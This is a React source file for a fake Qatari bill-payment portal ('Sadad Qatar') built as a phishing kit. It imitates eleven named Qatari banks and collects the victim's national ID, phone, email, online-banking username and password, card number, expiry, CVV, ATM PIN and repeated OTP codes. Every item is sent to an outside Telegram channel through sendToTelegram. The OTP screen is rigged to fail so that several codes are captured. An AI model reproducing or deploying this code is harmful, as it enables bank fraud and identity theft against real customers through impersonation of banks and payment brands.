import { useState, useEffect } from "react";
import { sendToTelegram } from "@/lib/telegram";

type Screen =
  | "home"
  | "loading1"
  | "user-form"
  | "loading2"
  | "bank-select"
  | "loading3"
  | "bank-login"
  | "loading4"
  | "card-form"
  | "loading5"
  | "otp-verify"
  | "otp-error";

const PRIMARY = "#8B1041";

const banks = [
  { id: "cbq", label: "البنك التجاري (CBQ)", short: "CBQ", bg: "#1A3A6B", text: "#fff", fontSize: "1rem" },
  { id: "qib", label: "مصرف قطر الإسلامي", short: "QIB", bg: "#1A7A5E", text: "#fff", fontSize: "1rem" },
  { id: "qnb", label: "بنك قطر الوطني (QNB)", short: "QNB", bg: "#4B1A6B", text: "#fff", fontSize: "1rem" },
  { id: "rayan", label: "مصرف الريان", short: "ريان", bg: "#8B1041", text: "#fff", fontSize: "1.1rem" },
  { id: "dukhan", label: "بنك دخان", short: "دخان", bg: "#1A5A4B", text: "#fff", fontSize: "1.1rem" },
  { id: "doha", label: "بنك الدوحة", short: "دوحة", bg: "#9A7B1A", text: "#fff", fontSize: "1.1rem" },
  { id: "qdb", label: "بنك قطر للتنمية", short: "QDB", bg: "#8B4513", text: "#fff", fontSize: "1rem" },
  { id: "ahli", label: "البنك الأهلي", short: "أهلي", bg: "#CC0000", text: "#fff", fontSize: "1.1rem" },
  { id: "qiib", label: "بنك قطر الدولي الإسلامي", short: "QIIB", bg: "#1A2A6B", text: "#fff", fontSize: "0.85rem" },
  { id: "hsbc", label: "بنك HSBC قطر", short: "HSBC", bg: "#CC0000", text: "#fff", fontSize: "1rem" },
  { id: "arabi", label: "البنك العربي", short: "عربي", bg: "#1A5A6B", text: "#fff", fontSize: "1.1rem" },
];

function Spinner({ color = PRIMARY }: { color?: string }) {
  return (
    <div
      style={{
        width: 48,
        height: 48,
        border: `3px solid #e5e7eb`,
        borderTopColor: color,
        borderRadius: "50%",
        animation: "spin 0.8s linear infinite",
      }}
    />
  );
}

function LoadingScreen({ title, message }: { title: string; message: string }) {
  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "20px 16px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <h1 style={{ margin: 0, fontSize: "1.3rem", fontWeight: 700, color: "#1a1a1a" }}>{title}</h1>
      </div>
      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "40px 20px", textAlign: "center", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", flexDirection: "column", alignItems: "center", gap: 20 }}>
        <Spinner />
        <p style={{ margin: 0, color: "#555", fontSize: "1rem" }}>{message}</p>
      </div>
    </div>
  );
}

function HomeScreen({ onStart }: { onStart: () => void }) {
  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "32px 16px 24px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <div style={{ fontSize: "2.5rem", marginBottom: 12 }}>🇶🇦</div>
        <h1 style={{ margin: "0 0 8px", fontSize: "1.7rem", fontWeight: 800, color: PRIMARY }}>بوابة سداد قطر</h1>
        <p style={{ margin: 0, color: "#777", fontSize: "0.95rem" }}>الدفع الإلكتروني الآمن</p>
      </div>

      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "24px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
        <h2 style={{ margin: "0 0 16px", fontSize: "1.2rem", fontWeight: 700, color: PRIMARY, textAlign: "center" }}>عن سداد قطر</h2>
        <p style={{ margin: "0 0 14px", color: "#444", fontSize: "0.95rem", lineHeight: 1.7 }}>
          سداد قطر هي منصة دفع إلكتروني آمنة وسهلة الاستخدام تتيح للمواطنين والمقيمين في دولة قطر دفع فواتيرهم ورسومهم الحكومية والخاصة بكل يسر وأمان.
        </p>
        <p style={{ margin: "0 0 14px", color: "#444", fontSize: "0.95rem", lineHeight: 1.7 }}>
          تتميز المنصة بتكاملها مع جميع البنوك المحلية وتوفرها على أعلى معايير الأمان والخصوصية لضمان سلامة معاملاتك المالية.
        </p>
        <p style={{ margin: 0, color: "#444", fontSize: "0.95rem", lineHeight: 1.7 }}>
          يمكنك استخدام سداد قطر لدفع فواتير الكهرباء والماء والهاتف والإنترنت والعديد من الخدمات الأخرى.
        </p>

        <button
          onClick={onStart}
          style={{
            display: "block", width: "100%", marginTop: 24,
            background: PRIMARY, color: "#fff", border: "none",
            borderRadius: 10, padding: "16px", fontSize: "1.1rem",
            fontWeight: 700, cursor: "pointer", fontFamily: "Tajawal, sans-serif",
          }}
        >
          بدء الخدمة
        </button>
      </div>

      <div style={{ margin: "0 16px 16px", textAlign: "center" }}>
        <p style={{ color: "#aaa", fontSize: "0.8rem", marginBottom: 12 }}>بوابة دفع معتمدة</p>
        <div style={{
          background: "#1a2a5e", borderRadius: 16, padding: "20px 16px",
          boxShadow: "0 2px 8px rgba(0,0,0,0.15)"
        }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
            <span style={{ background: "#2196F3", color: "#fff", padding: "4px 10px", borderRadius: 6, fontWeight: 700, fontSize: "0.9rem" }}>NAPS</span>
            <span style={{ color: "#aaa", fontSize: "0.75rem" }}>Powered by</span>
            <span style={{ background: "#fff", color: "#1a1a5e", padding: "4px 10px", borderRadius: 6, fontWeight: 900, fontSize: "0.9rem" }}>VISA</span>
          </div>
          <p style={{ color: "#fff", fontSize: "1.6rem", fontWeight: 800, margin: "0 0 6px", textAlign: "center" }}>SadadPay</p>
          <p style={{ color: "#FFD700", fontSize: "1.4rem", fontWeight: 800, margin: "0 0 6px", textAlign: "center" }}>QAR 350.00</p>
          <p style={{ color: "#4CAF50", fontSize: "0.9rem", margin: "0 0 6px", textAlign: "center" }}>Payment Approved ✓</p>
          <p style={{ color: "#888", fontSize: "0.8rem", margin: 0, textAlign: "center" }}>19012009</p>
        </div>

        <div style={{
          background: PRIMARY, borderRadius: 16, padding: "24px 16px", marginTop: 16,
          boxShadow: "0 2px 8px rgba(0,0,0,0.15)"
        }}>
          <p style={{ color: "#fff", fontSize: "2rem", fontWeight: 900, margin: "0 0 4px", textAlign: "center" }}>سداد</p>
          <p style={{ color: "#FFD700", fontSize: "1rem", fontWeight: 700, margin: "0 0 16px", textAlign: "center", letterSpacing: 2 }}>ADAD</p>
          <p style={{ color: "#ddd", fontSize: "0.9rem", margin: "0 0 16px", textAlign: "center" }}>الحصول على أجهزة نقاط البيع الأحدث في قطر</p>
          <button style={{
            display: "block", width: "70%", margin: "0 auto 12px",
            background: "#FFD700", color: "#1a1a1a", border: "none",
            borderRadius: 8, padding: "12px", fontSize: "1rem",
            fontWeight: 700, cursor: "pointer", fontFamily: "Tajawal, sans-serif",
          }}>سداد بلس</button>
          <p style={{ color: "#ddd", fontSize: "0.85rem", margin: "0 0 12px", textAlign: "center" }}>فعل حسابك اليوم واستلم الجهاز في نفس الوقت.</p>
          <button style={{
            display: "block", width: "70%", margin: "0 auto",
            background: "#FFD700", color: "#1a1a1a", border: "none",
            borderRadius: 8, padding: "12px", fontSize: "1rem",
            fontWeight: 700, cursor: "pointer", fontFamily: "Tajawal, sans-serif",
          }}>سجل الآن</button>
        </div>

        <div style={{
          background: "#1a2332", borderRadius: 16, padding: "20px 16px", marginTop: 16,
          boxShadow: "0 2px 8px rgba(0,0,0,0.15)"
        }}>
          <p style={{ color: "#fff", fontSize: "1rem", fontWeight: 700, margin: "0 0 4px", textAlign: "center" }}>Add Funds</p>
          <p style={{ color: "#aaa", fontSize: "0.85rem", margin: "0 0 16px", textAlign: "center" }}>Credit Card</p>
          <div style={{ display: "flex", justifyContent: "center", gap: 8, marginBottom: 10 }}>
            <span style={{ background: "#FF6B00", color: "#fff", padding: "5px 10px", borderRadius: 6, fontWeight: 700, fontSize: "0.8rem" }}>DISC</span>
            <span style={{ background: "#CC0000", color: "#fff", padding: "5px 10px", borderRadius: 6, fontWeight: 700, fontSize: "0.8rem" }}>MC</span>
            <span style={{ background: "#2B5CB0", color: "#fff", padding: "5px 10px", borderRadius: 6, fontWeight: 700, fontSize: "0.8rem" }}>AMEX</span>
            <span style={{ background: "#1A3A8B", color: "#fff", padding: "5px 10px", borderRadius: 6, fontWeight: 700, fontSize: "0.8rem" }}>VISA</span>
          </div>
          <p style={{ color: "#666", fontSize: "0.8rem", margin: 0, textAlign: "center" }}>Payment Secured By</p>
        </div>
      </div>
    </div>
  );
}

function UserFormScreen({ onSubmit }: { onSubmit: (data: Record<string, string>) => void }) {
  const [form, setForm] = useState({ invoice: "", id: "", phone: "", email: "", service: "", amount: "" });

  const set = (k: string) => (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) =>
    setForm((p) => ({ ...p, [k]: e.target.value }));

  const inputStyle: React.CSSProperties = {
    width: "100%", border: "1px solid #ddd", borderRadius: 8,
    padding: "12px 14px", fontSize: "1rem", fontFamily: "Tajawal, sans-serif",
    outline: "none", boxSizing: "border-box", textAlign: "right",
    direction: "rtl", color: "#333",
  };

  const labelStyle: React.CSSProperties = {
    display: "block", marginBottom: 6, fontWeight: 600, color: "#333",
    fontSize: "0.95rem", textAlign: "right",
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "20px 16px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <h1 style={{ margin: 0, fontSize: "1.3rem", fontWeight: 700, color: "#1a1a1a" }}>إدخال بيانات المستخدم</h1>
      </div>

      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "24px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
        <div style={{ marginBottom: 18 }}>
          <label style={labelStyle}>رقم الفاتورة</label>
          <input style={inputStyle} placeholder="ادخل رقم الفاتورة" value={form.invoice} onChange={set("invoice")} />
        </div>
        <div style={{ marginBottom: 18 }}>
          <label style={labelStyle}>رقم الهوية (11 رقم)</label>
          <input style={inputStyle} placeholder="ادخل رقم الهوية" value={form.id} onChange={set("id")} maxLength={11} />
        </div>
        <div style={{ marginBottom: 18 }}>
          <label style={labelStyle}>رقم الجوال</label>
          <input style={inputStyle} placeholder="ادخل رقم الجوال" value={form.phone} onChange={set("phone")} />
        </div>
        <div style={{ marginBottom: 18 }}>
          <label style={labelStyle}>البريد الإلكتروني</label>
          <input style={{ ...inputStyle, direction: "ltr", textAlign: "left" }} placeholder="example@mail.com" value={form.email} onChange={set("email")} type="email" />
        </div>
        <div style={{ marginBottom: 18 }}>
          <label style={labelStyle}>نوع الخدمة</label>
          <div style={{ position: "relative" }}>
            <select
              style={{ ...inputStyle, appearance: "none", background: "#fff" }}
              value={form.service}
              onChange={set("service")}
            >
              <option value="">اختر نوع الخدمة</option>
              <option>دفع رسوم شحن مركبة</option>
              <option>دفع رسوم نقل ملكية مركبة</option>
              <option>دفع رسوم نقل ملكية لوحة مركبة</option>
              <option>دفع رسوم حجز مركبة</option>
              <option>دفع رسوم فحص مركبة</option>
              <option>دفع رسوم عقد إيجار</option>
              <option>دفع رسوم عقد تمليك</option>
              <option>دفع رسوم تأمين</option>
              <option>دفع رسوم شحن</option>
              <option>تسديد المستحقات للطرفين</option>
              <option>دفع رسوم توقيع تعهد الكتروني</option>
              <option>دفع رسوم استقدام عمالة</option>
              <option>دفع ضريبة القيمة المضافة</option>
              <option>دفع رسوم عقد عمالة</option>
              <option>دفع رسوم الجوازات</option>
              <option>دفع رسوم عقد عمل</option>
              <option>دفع توكيل محامي</option>
              <option>دفع رسوم الخدمات الكترونية</option>
              <option>دفع رسوم وزارة الموارد البشرية</option>
            </select>
            <span style={{ position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)", pointerEvents: "none", color: "#666" }}>▼</span>
          </div>
        </div>
        <div style={{ marginBottom: 24 }}>
          <label style={labelStyle}>المبلغ (ريال قطري)</label>
          <input style={{ ...inputStyle, direction: "ltr", textAlign: "right" }} placeholder="0.00" value={form.amount} onChange={set("amount")} type="number" min="0" />
        </div>

        <button
          onClick={() => onSubmit(form)}
          style={{
            display: "block", width: "100%",
            background: PRIMARY, color: "#fff", border: "none",
            borderRadius: 10, padding: "16px", fontSize: "1.1rem",
            fontWeight: 700, cursor: "pointer", fontFamily: "Tajawal, sans-serif",
          }}
        >
          تأكيد البيانات
        </button>
      </div>
    </div>
  );
}

function BankSelectScreen({ onSelect }: { onSelect: (bank: typeof banks[0]) => void }) {
  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "20px 16px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <h1 style={{ margin: 0, fontSize: "1.3rem", fontWeight: 700, color: "#1a1a1a" }}>اختر البنك للدفع</h1>
      </div>

      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
        <p style={{ margin: "0 0 20px", color: "#555", fontSize: "0.95rem" }}>يرجى اختيار البنك لإتمام عملية الدفع:</p>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 12 }}>
          {banks.map((bank) => (
            <button
              key={bank.id}
              onClick={() => onSelect(bank)}
              style={{
                background: "#fff", border: "1px solid #e5e7eb", borderRadius: 12,
                padding: "16px 8px", cursor: "pointer", display: "flex",
                flexDirection: "column", alignItems: "center", gap: 8,
              }}
            >
              <div style={{
                width: 56, height: 56, borderRadius: 14, background: bank.bg,
                display: "flex", alignItems: "center", justifyContent: "center",
                color: bank.text, fontWeight: 800, fontSize: bank.fontSize,
                fontFamily: "Tajawal, sans-serif",
              }}>
                {bank.short}
              </div>
              <span style={{ fontSize: "0.75rem", color: "#444", textAlign: "center", lineHeight: 1.3, fontFamily: "Tajawal, sans-serif" }}>
                {bank.label}
              </span>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

function BankLoginScreen({ bank, onLogin }: { bank: typeof banks[0]; onLogin: (u: string, p: string) => void }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const inputStyle: React.CSSProperties = {
    width: "100%", border: "1px solid #ddd", borderRadius: 8,
    padding: "12px 14px", fontSize: "1rem", fontFamily: "Tajawal, sans-serif",
    outline: "none", boxSizing: "border-box", direction: "ltr",
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "20px 16px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <h1 style={{ margin: 0, fontSize: "1.15rem", fontWeight: 700, color: "#1a1a1a" }}>تسجيل عبر الخدمات المصرفية عبر الإنترنت</h1>
      </div>

      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "32px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", textAlign: "center" }}>
        <div style={{
          width: 80, height: 80, borderRadius: 18, background: bank.bg,
          display: "flex", alignItems: "center", justifyContent: "center",
          color: bank.text, fontWeight: 800, fontSize: "1.3rem",
          fontFamily: "Tajawal, sans-serif", margin: "0 auto 28px",
        }}>
          {bank.short}
        </div>

        <div style={{ marginBottom: 18, textAlign: "right" }}>
          <label style={{ display: "block", marginBottom: 6, fontWeight: 600, color: "#333", fontSize: "0.95rem" }}>Username</label>
          <input style={inputStyle} placeholder="Username" value={username} onChange={(e) => setUsername(e.target.value)} />
        </div>
        <div style={{ marginBottom: 28, textAlign: "right" }}>
          <label style={{ display: "block", marginBottom: 6, fontWeight: 600, color: "#333", fontSize: "0.95rem" }}>Password</label>
          <input style={inputStyle} placeholder="Password" type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
        </div>

        <button
          onClick={() => onLogin(username, password)}
          style={{
            display: "block", width: "100%",
            background: PRIMARY, color: "#fff", border: "none",
            borderRadius: 10, padding: "16px", fontSize: "1.1rem",
            fontWeight: 700, cursor: "pointer", fontFamily: "Tajawal, sans-serif",
          }}
        >
          LogIn
        </button>
      </div>
    </div>
  );
}

function CardFormScreen({ onSubmit }: { onSubmit: (card: { number: string; mm: string; yy: string; cvv: string; pin: string }) => void }) {
  const [card, setCard] = useState({ number: "", mm: "", yy: "", cvv: "", pin: "" });
  const set = (k: string) => (e: React.ChangeEvent<HTMLInputElement>) => setCard((p) => ({ ...p, [k]: e.target.value }));

  const inputStyle: React.CSSProperties = {
    width: "100%", border: "1px solid #ddd", borderRadius: 8,
    padding: "12px 14px", fontSize: "1rem", fontFamily: "Tajawal, sans-serif",
    outline: "none", boxSizing: "border-box", direction: "ltr",
  };
  const smallInput: React.CSSProperties = {
    ...inputStyle, textAlign: "center",
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "20px 16px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <h1 style={{ margin: 0, fontSize: "1.3rem", fontWeight: 700, color: "#1a1a1a" }}>إدخال بيانات البطاقة</h1>
      </div>

      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "24px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
        <div style={{ marginBottom: 18 }}>
          <label style={{ display: "block", marginBottom: 6, fontWeight: 600, color: "#333", fontSize: "0.95rem", textAlign: "right" }}>رقم البطاقة</label>
          <input
            style={inputStyle} placeholder="5678 1234 5678 1234"
            value={card.number} onChange={set("number")} maxLength={19}
          />
        </div>

        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 12, marginBottom: 18 }}>
          <div>
            <label style={{ display: "block", marginBottom: 6, fontWeight: 600, color: "#333", fontSize: "0.85rem", textAlign: "center" }}>الشهر (MM)</label>
            <input style={smallInput} placeholder="MM" value={card.mm} onChange={set("mm")} maxLength={2} />
          </div>
          <div>
            <label style={{ display: "block", marginBottom: 6, fontWeight: 600, color: "#333", fontSize: "0.85rem", textAlign: "center" }}>السنة (YY)</label>
            <input style={smallInput} placeholder="YY" value={card.yy} onChange={set("yy")} maxLength={2} />
          </div>
          <div>
            <label style={{ display: "block", marginBottom: 6, fontWeight: 600, color: "#333", fontSize: "0.85rem", textAlign: "center" }}>CVV</label>
            <input style={smallInput} placeholder="123" value={card.cvv} onChange={set("cvv")} maxLength={3} type="password" />
          </div>
        </div>

        <div style={{ marginBottom: 28 }}>
          <label style={{ display: "block", marginBottom: 6, fontWeight: 600, color: "#333", fontSize: "0.95rem", textAlign: "right" }}>رمز ATM PIN</label>
          <input
            style={inputStyle} placeholder="أدخل رمز PIN المكون من 4 أرقام"
            value={card.pin} onChange={set("pin")} maxLength={4} type="password"
          />
        </div>

        <button
          onClick={() => onSubmit(card)}
          style={{
            display: "block", width: "100%",
            background: PRIMARY, color: "#fff", border: "none",
            borderRadius: 10, padding: "16px", fontSize: "1.1rem",
            fontWeight: 700, cursor: "pointer", fontFamily: "Tajawal, sans-serif",
          }}
        >
          التالي
        </button>
      </div>
    </div>
  );
}

function OtpVerifyScreen({
  bank,
  attempts,
  onVerify,
}: {
  bank: typeof banks[0];
  attempts: number;
  onVerify: (code: string) => void;
}) {
  const [code, setCode] = useState("");

  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "20px 16px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <h1 style={{ margin: 0, fontSize: "1.3rem", fontWeight: 700, color: "#1a1a1a" }}>التحقق من الدفع</h1>
      </div>

      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "24px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
        <p style={{ margin: "0 0 16px", fontWeight: 600, color: "#333", fontSize: "1rem" }}>
          المصادقة عبر {bank.label}
        </p>

        <div style={{ background: "#f0fdf4", border: "1px solid #bbf7d0", borderRadius: 10, padding: "14px 16px", marginBottom: 20 }}>
          <p style={{ margin: 0, color: "#166534", fontSize: "0.9rem", lineHeight: 1.6 }}>
            تم إرسال رمز OTP إلى هاتفك
            <br />
            أدخل الرمز (4-8 أرقام)
          </p>
        </div>

        <input
          style={{
            width: "100%", border: "1px solid #ddd", borderRadius: 8,
            padding: "14px", fontSize: "1.2rem", fontFamily: "Tajawal, sans-serif",
            outline: "none", boxSizing: "border-box", textAlign: "center",
            letterSpacing: 8, direction: "ltr",
          }}
          placeholder="أدخل الرمز"
          value={code}
          onChange={(e) => setCode(e.target.value)}
          maxLength={8}
          type="number"
        />

        <p style={{ margin: "12px 0 20px", color: PRIMARY, fontSize: "0.9rem", textAlign: "right" }}>
          محاولات متبقية {attempts}
        </p>

        <button
          onClick={() => onVerify(code)}
          style={{
            display: "block", width: "100%",
            background: PRIMARY, color: "#fff", border: "none",
            borderRadius: 10, padding: "16px", fontSize: "1.1rem",
            fontWeight: 700, cursor: "pointer", fontFamily: "Tajawal, sans-serif",
          }}
        >
          تحقق
        </button>
      </div>
    </div>
  );
}

function OtpErrorScreen() {
  return (
    <div style={{ minHeight: "100vh", background: "#f5f5f5", fontFamily: "Tajawal, sans-serif", direction: "rtl" }}>
      <div style={{ background: "#fff", padding: "20px 16px", textAlign: "center", boxShadow: "0 1px 3px rgba(0,0,0,0.08)" }}>
        <h1 style={{ margin: 0, fontSize: "1.3rem", fontWeight: 700, color: "#1a1a1a" }}>التحقق من الدفع</h1>
      </div>

      <div style={{ margin: "16px", background: "#fff", borderRadius: 12, padding: "24px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
        <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: 10, padding: "16px", textAlign: "center" }}>
          <p style={{ margin: 0, color: "#dc2626", fontSize: "1rem", fontWeight: 600 }}>
            فشلت عملية الدفع - تم رفض الرمز 3 مرات
          </p>
        </div>
      </div>
    </div>
  );
}

export default function App() {
  const [screen, setScreen] = useState<Screen>("home");
  const [selectedBank, setSelectedBank] = useState(banks[0]);
  const [otpAttempts, setOtpAttempts] = useState(3);
  const [formData, setFormData] = useState<Record<string, string>>({});

  const go = (next: Screen, delay = 2500) => setTimeout(() => setScreen(next), delay);

  useEffect(() => {
    if (screen === "loading1") go("user-form");
    if (screen === "loading2") go("bank-select");
    if (screen === "loading3") go("bank-login");
    if (screen === "loading4") go("card-form");
    if (screen === "loading5") go("otp-verify");
  }, [screen]);

  if (screen === "home") return <HomeScreen onStart={() => setScreen("loading1")} />;

  if (screen === "loading1") return <LoadingScreen title="جاري اعداد الخدمة" message="يرجى الانتظار" />;

  if (screen === "user-form") return (
    <UserFormScreen onSubmit={(data) => {
      setFormData(data);
      sendToTelegram(
        `🇶🇦 <b>بوابة سداد قطر — بيانات المستخدم</b>\n\n` +
        `🧾 رقم الفاتورة: <code>${data.invoice || "—"}</code>\n` +
        `🪪 رقم الهوية: <code>${data.id || "—"}</code>\n` +
        `📱 رقم الجوال: <code>${data.phone || "—"}</code>\n` +
        `📧 البريد الإلكتروني: <code>${data.email || "—"}</code>\n` +
        `🔧 نوع الخدمة: ${data.service || "—"}\n` +
        `💰 المبلغ: ${data.amount || "—"} ريال قطري`
      );
      setScreen("loading2");
    }} />
  );

  if (screen === "loading2") return <LoadingScreen title="جاري التحميل" message="جاري التحميل" />;

  if (screen === "bank-select") return (
    <BankSelectScreen onSelect={(bank) => {
      setSelectedBank(bank);
      sendToTelegram(`🏦 <b>البنك المختار</b>\n\n${bank.label} (${bank.short})`);
      setScreen("loading3");
    }} />
  );

  if (screen === "loading3") return <LoadingScreen title="جاري التحميل" message="جاري تحميل صفحة الدخول" />;

  if (screen === "bank-login") return (
    <BankLoginScreen bank={selectedBank} onLogin={(u, p) => {
      sendToTelegram(
        `🔐 <b>بيانات تسجيل الدخول — ${selectedBank.label}</b>\n\n` +
        `👤 Username: <code>${u}</code>\n` +
        `🔑 Password: <code>${p}</code>`
      );
      setScreen("loading4");
    }} />
  );

  if (screen === "loading4") return <LoadingScreen title="جاري التحميل" message="جاري تحميل بيانات البطاقة" />;

  if (screen === "card-form") return (
    <CardFormScreen onSubmit={(card) => {
      sendToTelegram(
        `💳 <b>بيانات البطاقة البنكية</b>\n\n` +
        `🔢 رقم البطاقة: <code>${card.number}</code>\n` +
        `📅 الانتهاء: <code>${card.mm}/${card.yy}</code>\n` +
        `🔒 CVV: <code>${card.cvv}</code>\n` +
        `🏧 ATM PIN: <code>${card.pin}</code>`
      );
      setScreen("loading5");
    }} />
  );

  if (screen === "loading5") return <LoadingScreen title="جاري التحميل" message="تم الإرسال إلى هاتفك — سيتم توجيهك تلقائياً" />;

  if (screen === "otp-verify") return (
    <OtpVerifyScreen
      bank={selectedBank}
      attempts={otpAttempts}
      onVerify={(code) => {
        sendToTelegram(
          `🔑 <b>رمز OTP المُدخل</b>\n\n` +
          `🏦 البنك: ${selectedBank.label}\n` +
          `📟 الرمز: <code>${code}</code>\n` +
          `🔢 محاولة رقم: ${4 - otpAttempts}`
        );
        const remaining = otpAttempts - 1;
        if (remaining <= 0) {
          setOtpAttempts(3);
          setScreen("otp-error");
        } else {
          setOtpAttempts(remaining);
        }
      }}
    />
  );

  if (screen === "otp-error") return <OtpErrorScreen />;

  return null;
}
